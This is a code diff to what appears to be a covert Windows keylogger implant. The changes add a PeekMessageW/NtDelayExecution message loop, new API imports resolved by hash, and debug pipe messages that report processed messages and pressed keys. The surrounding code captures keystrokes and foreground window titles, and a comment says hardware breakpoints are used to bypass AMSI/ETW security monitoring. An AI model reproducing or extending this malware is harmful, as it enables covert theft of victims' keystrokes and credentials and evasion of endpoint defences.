@@ -103,6 +103,7 @@ auto DECLFN KeyloggerInstall(
 
     MSG Msg = { 0 };
 
+    /*
     BOOL bRet = 0;
 
     Instance->Win32.PostMessageW(WindowHandle, WM_USER, 0, 0);
@@ -119,6 +120,28 @@ auto DECLFN KeyloggerInstall(
 		SafePipeWrite("[+] Processing message\n", 23);
         Instance->Win32.TranslateMessage(&Msg);
         Instance->Win32.DispatchMessageW(&Msg);
+    }
+
+    */
+
+    while (TRUE)
+    {
+        if (Instance->Win32.PeekMessageW(&Msg, NULL, 0, 0, PM_REMOVE))
+        {
+            if (Msg.message == WM_QUIT)
+            {
+                SafePipeWrite("[+] WM_QUIT received, exiting...\n", 30);
+                break;
+            }
+            Instance->Win32.TranslateMessage(&Msg);
+            Instance->Win32.DispatchMessageW(&Msg);
+        }
+        else
+        {
+			LARGE_INTEGER Interval;
+			Interval.QuadPart = -10 * 1000 * 10; // 10 ms
+			Instance->Win32.NtDelayExecution(FALSE, &Interval);
+        }
     }
 
     // deactive hwbp to bypass amsi/etw
@@ -272,6 +295,8 @@ VOID ProcessWindowTitle()
     Instance->Win32.RtlSecureZeroMemory(Buffer, sizeof(Buffer));
     Instance->Win32.RtlSecureZeroMemory(Title, sizeof(Title));
 
+	SafePipeWrite("[+] Checking window title...\n", 28);
+
     // get current foreground/active window title
     if ((CurrentWindow = Instance->Win32.GetForegroundWindow()))
     {
@@ -309,6 +334,8 @@ VOID ProcessKey(UINT Key)
 
     // log the current window title if it has been changed 
     ProcessWindowTitle();
+
+	SafePipeWrite("[+] Key Pressed: ", 16);
 
     Instance->Win32.GetKeyState(0);
     Instance->Win32.GetKeyboardState(Keyboard);
@@ -407,6 +434,7 @@ auto DECLFN LoadEssentials( INSTANCE* Instance ) -> VOID {
     Instance->Win32.SetStdHandle        = (decltype(Instance->Win32.SetStdHandle))LoadApi(Kernel32, HashStr("SetStdHandle"));
     Instance->Win32.GetStdHandle        = (decltype(Instance->Win32.GetStdHandle))LoadApi(Kernel32, HashStr("GetStdHandle"));
 
+	Instance->Win32.NtDelayExecution = (decltype(Instance->Win32.NtDelayExecution))LoadApi(Ntdll, HashStr("NtDelayExecution"));
     Instance->Win32.NtGetContextThread = (decltype(Instance->Win32.NtGetContextThread))LoadApi(Ntdll, HashStr("NtGetContextThread"));
     Instance->Win32.NtContinue         = (decltype(Instance->Win32.NtContinue))LoadApi(Ntdll, HashStr("NtContinue"));
     Instance->Win32.RtlCaptureContext  = (decltype(Instance->Win32.RtlCaptureContext))LoadApi(Ntdll, HashStr("RtlCaptureContext"));
@@ -433,6 +461,7 @@ auto DECLFN LoadEssentials( INSTANCE* Instance ) -> VOID {
     Instance->Win32.CreateWindowExW = (decltype(Instance->Win32.CreateWindowExW))LoadApi(User32, HashStr("CreateWindowExW"));
     Instance->Win32.RegisterRawInputDevices = (decltype(Instance->Win32.RegisterRawInputDevices))LoadApi(User32, HashStr("RegisterRawInputDevices"));
     Instance->Win32.GetMessageW = (decltype(Instance->Win32.GetMessageW))LoadApi(User32, HashStr("GetMessageW"));
+	Instance->Win32.PeekMessageW = (decltype(Instance->Win32.PeekMessageW))LoadApi(User32, HashStr("PeekMessageW"));
     Instance->Win32.TranslateMessage = (decltype(Instance->Win32.TranslateMessage))LoadApi(User32, HashStr("TranslateMessage"));
     Instance->Win32.DispatchMessageW = (decltype(Instance->Win32.DispatchMessageW))LoadApi(User32, HashStr("DispatchMessageW"));
     Instance->Win32.PostQuitMessage = (decltype(Instance->Win32.PostQuitMessage))LoadApi(User32, HashStr("PostQuitMessage"));
